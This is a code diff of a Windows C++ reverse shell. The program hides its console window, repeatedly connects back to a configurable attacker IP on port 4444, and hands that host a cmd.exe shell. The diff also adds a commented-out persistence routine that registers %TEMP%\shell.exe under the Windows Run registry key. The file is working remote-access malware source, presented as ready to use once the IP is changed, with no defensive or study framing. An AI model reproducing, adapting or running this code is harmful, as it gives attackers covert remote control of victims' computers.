@@ -1,6 +1,7 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <ws2tcpip.h>
+#include <wtypes.h>
 #pragma comment(lib, "Ws2_32.lib")
 #define DEFAULT_BUFLEN 1024
 
@@ -9,10 +10,17 @@ void HideConsole()
     ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
 }
 
+//void Persistence() {
+//    std::wstring progPath = L"%TEMP%\\shell.exe";
+//    HKEY hkey = NULL;
+//    LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); //Creates a key       
+//    LONG status = RegSetValueEx(hkey, L"Google Shit", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
+// }
 
 void RunShell(char* RemoteServer, int Port) {
     while (true) {
         Sleep(5000);    // Five Second
+        
 
         SOCKET mySocket;
         sockaddr_in addr;
@@ -39,7 +47,7 @@ void RunShell(char* RemoteServer, int Port) {
                 continue;
             }
             else {
-                char Process[] = "powershell.exe";
+                char Process[] = "cmd.exe";
                 STARTUPINFO sinfo;
                 PROCESS_INFORMATION pinfo;
                 memset(&sinfo, 0, sizeof(sinfo));
@@ -68,12 +76,13 @@ void RunShell(char* RemoteServer, int Port) {
 
 int main(int argc, char** argv) {
     HideConsole();
+    //Persistence();
     if (argc == 3) {
         int port = atoi(argv[2]);
         RunShell(argv[1], port);
     }
     else {
-        char host[] = "192.168.1.28";  // change this to your ip address
+        char host[] = "192.168.1.33";  // change this to your ip address
         int port = 4444;                //chnage this to your open port
         RunShell(host, port);
     }
